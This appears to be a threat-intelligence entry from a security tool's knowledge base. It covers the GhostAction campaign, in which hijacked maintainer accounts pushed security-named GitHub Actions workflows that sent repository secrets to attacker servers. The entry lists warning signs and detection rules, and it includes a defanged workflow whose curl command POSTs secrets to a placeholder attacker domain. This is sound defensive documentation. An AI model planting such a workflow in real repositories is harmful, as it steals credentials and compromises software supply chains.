# GhostAction

**Type:** CI/CD & GitHub platform · **When:** September 2025 · **Status:** confirmed (an October 2026 variant is unconfirmed)

## What happened

Attackers used stolen maintainer accounts to push a workflow named like a security check, which sent the repo's secrets to an attacker server. GitGuardian counted 327 users, 817 repos and 3,325 stolen secrets (mostly DockerHub, GitHub and npm tokens). 24 packages were at risk. GitGuardian filed alert issues in 573 repos.

## How it got in

1. Initial access is unknown.
2. 2025-09-02: the compromised account `Grommash9` (FastUUID) pushed a commit "Add Github Actions Security workflow". It added `.github/workflows/github_actions_security.yml`.
3. The workflow ran on `push` and `workflow_dispatch`. It used curl to POST secrets to an attacker host. Later waves used other hosts.
4. The attacker read secret names from the repo's real workflows and hardcoded them (for example `PYPI_API_TOKEN`, `CF_API_TOKEN`).
5. The same commit went to at least 5 other public repos and about 10 private ones that day.
6. 2025-09-09: a second wave of about 500 commits hit 14 new repos.

Unconfirmed: a reported October 2026 variant used two compromised maintainer accounts to inject `security-audit.yml` into 345 repos. It searched the working tree and git history for cloud credentials. The report is attributed to StepSecurity and could not be checked against a primary source.

## Why it was hard to spot

- The file name and commit message mention "security" and sound helpful.
- The push came from a real maintainer account, and secret names were tailored to each repo, so the file looked like it belonged.

## Signs to look for

- In one change: look for a new file under `.github/workflows/` that lists many `secrets.*` or uses `toJSON(secrets)`, makes a curl/wget POST, and runs on `push` plus `workflow_dispatch`.
- Across changes over time: watch for the same commit message or same file hash pushed to many repos by one account within minutes.

## Defanged example

```yaml
# .github/workflows/<security-sounding-name>.yml
on: [push, workflow_dispatch]
jobs:
  run:
    steps:
      - run: curl -X POST https://<attacker-domain>/ -d "${{ secrets.<NAME_1> }} ${{ secrets.<NAME_2> }}"
```

## How Pushguard catches it

- **Diff rules:** `ci-secret-exfiltration` (secrets or environment piped to the network), `ci-workflow-changed`, and `ci-agent-shaped-push` (workflow changed off-hours with no PR). `unreviewed-push-to-main` adds context.
- **Out-of-band:** if the attacker closes Pushguard's alert issue, a meta-alert goes to Slack/Discord.
- **Not built:** a dedicated cross-repo burst detector. Each repo's push gets its own alert, but nothing yet joins "same commit, many repos, one pusher".

## References

- [GitGuardian](https://blog.gitguardian.com/ghostaction-campaign-3-325-secrets-stolen/)
- [StepSecurity](https://www.stepsecurity.io/blog/ghostaction-campaign-over-3-000-secrets-stolen-through-malicious-github-workflows)
- [LetsDataScience](https://letsdatascience.com/news/ghostaction-injects-credential-stealing-github-workflows-95439117) (October 2026 variant; unverified)
